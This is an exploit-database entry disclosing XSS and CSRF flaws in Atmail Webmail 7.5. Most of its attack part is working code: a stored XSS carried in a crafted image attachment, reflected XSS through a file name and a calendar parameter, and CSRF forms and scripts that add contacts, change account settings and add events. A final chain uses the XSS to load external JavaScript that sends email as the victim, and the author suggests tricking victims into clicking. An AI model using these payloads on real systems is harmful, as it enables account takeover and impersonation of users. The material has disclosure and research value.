@@ -1,0 +1,377 @@
+id: 23253
+date: 02/07/2015
+title: Atmail Webmail 7.5 - Multiple Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: Atmail Webmail => 7.5 - Multiple Vulnerabilities
+#Date: 02.07.2014
+#Vendor: atmail.com
+#Version: => 7.5.0 (Latest ATM)
+#Contact: smash[at]devilteam.pl
+#Author: Smash_
+#PoC: demo.atmail.com
+
+
+ - Agenda
+
+Atmail is a commercial Linux messaging platform provider, the company develops webmail service known as Atmail Webmail. Latest version of Atmail, including desktop and mobile versions, suffers on multiple XSS and CSRF vulnerabilities, which may lead to account takeover.
+
+Attacker is able to inject stored XSS into received emails, change account settings or even send email as a victim. Examples are shown below.
+
+0day.
+
+
+ - Vulns
+
+ 1/ Atmail Desktop & Atmail Mobile
+
+ a) Stored XSS in Received email 
+
+First vulnereability affects both versions of Atmail. It is able to inject stored XSS into user account via file upload, have a look:
+
+devil@hell:~/Images$ cat xss.png
+<script>alert(666)</script>
+
+If you will send an email to victim with following attachment, it will be displayed in email, also attachment will be available under specific url, e.g:
+https://demo.atmail.com/index.php/mail/viewmessage/getattachment/folder/INBOX/uniqueId/11/mimeType/aW1hZ2UvcG5n/filenameOriginal/73308fee066e5b1baa9ff7db85150b8b
+
+Whenever user will click on attachment, for example to enlarge it, below http request will be executed:
+GET /index.php/mail/viewmessage/getattachment/folder/INBOX/uniqueId/11/mimeType/aW1hZ2UvcG5n/filenameOriginal/73308fee066e5b1baa9ff7db85150b8b HTTP/1.1
+Host: demo.atmail.com
+
+Response:
+HTTP/1.1 200 OK
+Expires: 0
+Cache-Control: must-revalidate
+Pragma: public
+Content-Description: File Transfer
+Content-Disposition: inline; filename="xss.png"
+Content-Length: 28
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: : application/octet-stream
+
+<script>alert(666)</script>
+
+...alert will be executed.
+
+Just send crafted file to victim, and ask him to click on the image if it doesn't load 
+correctly. You may also just send link to victim of uploaded image that include js.
+
+
+ 2/ Atmail Desktop 
+
+ b) Reflected Self-XSS - File upload
+
+Whenever name of uploaded file will consist of html/js payload, it will be executed while uploading (e.g. attachment of email). Attacker would need to induce user to upload crafted file.
+
+Request:
+POST /index.php/mail/webdav/upload/ HTTP/1.1
+Host: demo.atmail.com
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------492652708397401070402240553
+Content-Length: 6044
+
+-----------------------------492652708397401070402240553
+Content-Disposition: form-data; name="atmailCSRF"
+
+a0xSb0lVcTZKN2lBRUxqakxRMDlBMzVSQXBpM1ErYzZrUTFGYjNoWDJkRjJLbU9pOk1USXhORE14TnpBME1BPT0=
+-----------------------------492652708397401070402240553
+Content-Disposition: form-data; name="folder"
+
+Documents
+-----------------------------492652708397401070402240553
+Content-Disposition: form-data; name="newAttachmentStorage"; filename="<img src=# onerror=alert(123)>.png"
+Content-Type: image/png
+
+(...)
+-----------------------------492652708397401070402240553--
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 05 Feb 2015 21:04:56 GMT
+
+<img src=# onerror=alert(123)>.png
+
+
+ c) Reflected XSS - Calendar Popup
+
+It is a must to provide valid values of contextId, id and relative_href. 
+
+Request:
+https://demo.atmail.com/index.php/mail/calendar/popup/?contextId=%23calpop%27%29;%22%20onmouseover=alert%28666%29%20x=%22&id=e7a7b4d9-6840-42b6-afe6-01e4e0f08f55&relative_href=%2Fcalendars%2Fdemo_glj0%40demo.atmail.com%2Fcalendar%2Fpopup=true&componentType=VTODO&addOrEdit=edit
+
+Response:
+(...)
+    <ul id="EditEvent-Btns">
+        <li onclick="deleteEvent('25f57d30-ad76-415a-a16b-61af8840d579', 'VTODO');"><a href="#"><span><strong>Delete</strong></span></a></li>        <li class="EventSave" onclick="saveAndExit('#calpop');" onmouseover=alert(666) x="', false, 'VTODO', 'edit');"><a href="#"><span><strong>Save</strong></span></a></li>
+        <li class="EventCancel" onclick="saveAndExit('#calpop');" onmouseover=alert(666) x="', true);"><a href="#"><span><strong>Cancel</strong></span></a></li>
+    </ul>
+(...)
+
+
+ d) CSRF - Add Contact
+
+ It is able to bypass several CSRF protection tokens while adding a contact, using 'import' function.
+
+ Request looks like this:
+ -----------------------------1321143121674483220575199094
+Content-Disposition: form-data; name="GroupID"
+
+0
+-----------------------------1321143121674483220575199094
+Content-Disposition: form-data; name="ImportFile"; filename="woot.vcf"
+Content-Type: text/vcard
+
+BEGIN:VCARD
+VERSION:3.0
+FN:wootwoot
+N:uh;oh;;;
+ORG:;
+EMAIL;type=INTERNET;type=HOME;type=pref:woot@woot
+END:VCARD
+
+-----------------------------1321143121674483220575199094--
+
+...while regular 'add user' request looks like:
+atmailCSRF=VXVFS2hvMmtScTBJbXdod2F2VGo1cnNIOUN1RHp6SWtZWktBK25lNlcvRVRYMlRtOk5ERTFOelV3TkRJNQ%3D%3D&contact%5Bid%5D=&contact%5BserverID%5D=&contact%5BNewContact%5D=1&contact%5BGroupID%5D=&contact%5BFavourite%5D=0&contact%5BUserFirstName%5D=&contact%5BUserLastName%5D=&contact%5BnumberFieldName%5D%5B%5D=UserHomePhone&contact%5BnumberValue%5D%5B%5D=&contact%5BemailFieldName%5D%5B%5D=UserEmail&contact%5BemailValue%5D%5B%5D=&contact%5BUserHomeAddress%5D=&contact%5BUserHomeCity%5D=&contact%5BUserHomeState%5D=&contact%5BUserHomeZip%5D=&contact%5BUserHomeCountry%5D=&contact%5BUserWorkAddress%5D=&contact%5BUserWorkCity%5D=&contact%5BUserWorkState%5D=&contact%5BUserWorkZip%5D=&contact%5BUserWorkCountry%5D=&contact%5BUserWorkCompany%5D=&contact%5BUserTitle%5D=&contact%5BUserMiddleName%5D=&contact%5BUserDOB%5D=&contact%5BUserURL%5D=&contact%5BUserWorkTitle%5D=&contact%5BUserWorkDept%5D=&contact%5BUserInfo%5D=&atmailCSRF=ZWdraXZ1WE1iclVRZ3pDWmcreWJEc00vSEVPNzUxcGNucXFvZ2g5Q1k1azRaQXVLOk1URTJOemc1TnpZME1BPT0%3D
+
+PoC:
+ <script>
+function submitRequest()
+{
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://demo.atmail.com/index.php/mail/contacts/import", true);
+  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------11955679271300344735628552430");
+  xhr.withCredentials = true;
+  var body = "-----------------------------11955679271300344735628552430\r\n" + 
+ "Content-Disposition: form-data; name=\"GroupID\"\r\n" + 
+ "\r\n" + 
+ "0\r\n" + 
+ "-----------------------------11955679271300344735628552430\r\n" + 
+ "Content-Disposition: form-data; name=\"ImportFile\"; filename=\"woot.vcf\"\r\n" + 
+ "Content-Type: text/vcard\r\n" + 
+ "\r\n" + 
+ "BEGIN:VCARD\r\n" + 
+ "VERSION:3.0\r\n" + 
+ "FN:sup.\r\n" + 
+ "N:\r\n" + 
+ "ORG:;\r\n" + 
+ "EMAIL;type=INTERNET;type=HOME;type=pref:woot@woot\r\n" + 
+ "END:VCARD\r\n" + 
+ "\r\n" + 
+ "-----------------------------11955679271300344735628552430--\r\n";
+  var aBody = new Uint8Array(body.length);
+  for (var i = 0; i < aBody.length; i++)
+ aBody[i] = body.charCodeAt(i); 
+  xhr.send(new Blob([aBody]));
+}
+
+submitRequest();
+ </script>
+
+
+ e) CSRF - Add Photo to Contact
+
+PoC:
+ <script>
+function submitRequest()
+{
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://demo.atmail.com/index.php/mail/contacts/addphoto", true);
+  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------7991427614816100631567933826");
+  xhr.withCredentials = true;
+  var body = "-----------------------------7991427614816100631567933826\r\n" + 
+ "Content-Disposition: form-data; name=\"id\"\r\n" + 
+ "\r\n" + 
+ "2305177\r\n" + 
+ "-----------------------------7991427614816100631567933826\r\n" + 
+ "Content-Disposition: form-data; name=\"GroupID\"\r\n" + 
+ "\r\n" + 
+ "\r\n" + 
+ "-----------------------------7991427614816100631567933826\r\n" + 
+ "Content-Disposition: form-data; name=\"OriginImg\"\r\n" + 
+ "\r\n" + 
+ "https://demo.atmail.com/index.php/mail/contacts/viewphoto/id/2305177/699999193\r\n" + 
+ "-----------------------------7991427614816100631567933826\r\n" + 
+ "Content-Disposition: form-data; name=\"UserPhoto\"; filename=\"woot\x3e.png\"\r\n" + 
+ "Content-Type: image/png\r\n" + 
+ "\r\n" + 
+ "abc\r\n" + 
+ "-----------------------------7991427614816100631567933826--\r\n";
+  var aBody = new Uint8Array(body.length);
+  for (var i = 0; i < aBody.length; i++)
+ aBody[i] = body.charCodeAt(i); 
+  xhr.send(new Blob([aBody]));
+}
+
+submitRequest();
+ </script>
+
+
+
+2/ Atmail Mobile
+
+ f) CSRF - Change account settings
+
+It is able to change values such as display name and reply-to.
+
+PoC:
+<html>
+  <body>
+    <form action="https://demo.atmail.com/index.php/api/settings/webmailsave" method="POST">
+      <input type="hidden" name="fields&#91;RealName&#93;" value="lelz" />
+      <input type="hidden" name="fields&#91;ReplyTo&#93;" value="madhax0r&#64;uh&#46;oh" />
+      <input type="hidden" name="fields&#91;DeleteTrashOnLogout&#93;" value="0" />
+      <input type="hidden" name="fields&#91;enableAccessibility&#93;" value="0" />
+      <input type="hidden" name="fields&#91;MsgNum&#93;" value="25" />
+      <input type="hidden" name="fields&#91;DateDisplay&#93;" value="1" />
+      <input type="hidden" name="fields&#91;TimeZone&#93;" value="America&#47;Los&#95;Angeles" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+Other PoC:
+<script>
+  function submitRequest()
+  {
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://demo.atmail.com/index.php/api/settings/webmailsave", true);
+xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
+xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+xhr.withCredentials = true;
+var body = "fields%5BRealName%5D=woot&fields%5BReplyTo%5D=madhax0r%40uh.oh&fields%5BDeleteTrashOnLogout%5D=0&fields%5BenableAccessibility%5D=0&fields%5BMsgNum%5D=25&fields%5BDateDisplay%5D=1&fields%5BTimeZone%5D=America%2FLos_Angeles";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+  aBody[i] = body.charCodeAt(i); 
+xhr.send(new Blob([aBody]));
+  }
+  submitRequest();
+</script>
+
+ 
+ g) CSRF  - Add Event do Calendar
+
+You may find more CSRF vulns in mobile version of Atmail, especially using XSS so you can bypass some CSRF restrictions.
+
+PoC:
+<html>
+  <body>
+    <form action="https://demo.atmail.com/index.php/api/calendar/add" method="POST">
+      <input type="hidden" name="Msg&#95;Type" value="General" />
+      <input type="hidden" name="Msg&#95;Title" value="woot" />
+      <input type="hidden" name="Location" value="hell" />
+      <input type="hidden" name="startDate" value="1423242720" />
+      <input type="hidden" name="endDate" value="1423244520" />
+      <input type="hidden" name="Msg&#95;Text" value="sup" />
+      <input type="hidden" name="relative&#95;href" value="&#47;calendars&#47;demo&#95;glj0&#37;40demo&#46;atmail&#46;com&#47;calendar&#47;" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+
+ h) CSRF via XSS - Send email 
+
+In Desktop Version af atmail, sending an email is secured by two CSRF tokens:
+atmailCSRF=Ym0wMk5JY0Z6Z1hyT1dyUFFHR3hOOVhteHFFYWZ5ZTV5WVl1TE9zd0FEL2QwQWdQOk56a3dNVFl5TVRZMg%3D%3D&tabId=viewmessageTab5&composeID=uidb1e37b05c6&relatedMessageFolder=&relatedMessageUIDs=&relatedMessageMessageId=&relatedMessageResponseType=&relatedDraftUID=&readReceiptRequested=false&emailTo=&emailSubject=&emailCc=&emailBcc=&emailBodyHtml=%3Cbr%3E&atmailCSRF=Ym0wMk5JY0Z6Z1hyT1dyUFFHR3hOOVhteHFFYWZ5ZTV5WVl1TE9zd0FEL2QwQWdQOk56a3dNVFl5TVRZMg%3D%3D
+
+In a Mobile version, it isn't secured by tokens at all:
+POST /index.php/mobile/index/send HTTP/1.1
+Host: demo.atmail.com
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF: 1
+X-Requested-With: XMLHttpRequest
+Referer: https://demo.atmail.com/index.php/mobile
+Content-Length: 89
+Cookie: __utma=69257664.594442521.1423085360.1423085360.1423085360.1; __utmz=69257664.1423085360.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); atmail6=ivsjdsdcjjovf67ufaus2f8nb0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+emailTo=demo_ork8%40demo.atmail.com&emailCc=&emailBcc=&emailSubject=sup&emailBodyText=abc
+
+...anyway, you can't craft CSRF request because of custom X-CSRF header.
+
+It is able to bypass this restriction, using XSS vulnerability on the same domain that atmail is implemented. 
+
+In example shown below, i'm using mentioned stored XSS in received email, to include external .js and send an email as a victim.
+
+#1 - So, user is requesting XSS payload:
+GET /index.php/mail/viewmessage/getattachment/folder/INBOX/uniqueId/12/mimeType/aW1hZ2UvcG5n/filenameOriginal/63d53a11efa5b36ca853b6471cc540ff/attachmentId/3 HTTP/1.1
+
+#1 - Response:
+HTTP/1.1 200 OK
+Expires: 0
+Cache-Control: must-revalidate
+Pragma: public
+Content-Description: File Transfer
+Content-Disposition: inline; filename="xss1.png"
+Content-Length: 88
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: : application/octet-stream
+
+ <script src="https://raw.githubusercontent.com/Smaash/random/master/hmm.js"></script> 
+
+#2 - Request (external js inclusion):
+GET /Smaash/random/master/hmm.js HTTP/1.1
+Host: raw.githubusercontent.com
+
+#2 - Response:
+HTTP/1.1 200 OK
+Vary: Authorization,Accept-Encoding
+Expires: Fri, 06 Feb 2015 23:16:12 GMT
+Source-Age: 12
+Keep-Alive: timeout=10, max=50
+Connection: Keep-Alive
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://demo.atmail.com/index.php/mobile/index/send", true);
+xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
+xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+xhr.setRequestHeader("X-CSRF", 1);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+xhr.withCredentials = true;
+var body = "emailTo=smash@devilteam.pl&emailCc=&emailBcc=&emailSubject=abc&emailBodyText=abc";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+  aBody[i] = body.charCodeAt(i); 
+xhr.send(new Blob([aBody]));
+
+#3 - Request:
+POST /index.php/mobile/index/send HTTP/1.1
+Host: demo.atmail.com
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF: 1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://demo.atmail.com/index.php/mail/viewmessage/getattachment/folder/INBOX/uniqueId/12/mimeType/aW1hZ2UvcG5n/filenameOriginal/63d53a11efa5b36ca853b6471cc540ff/attachmentId/3
+Content-Length: 80
+Cookie: __utma=69257664.594442521.1423085360.1423085360.1423085360.1; __utmz=69257664.1423085360.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); atmail6=ivsjdsdcjjovf67ufaus2f8nb0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+emailTo=smash@devilteam.pl&emailCc=&emailBcc=&emailSubject=abc&emailBodyText=abc
+
+Email just have been send correctly.
+
+
+eof.
+
+#  0day.today [2023-03-22]  #
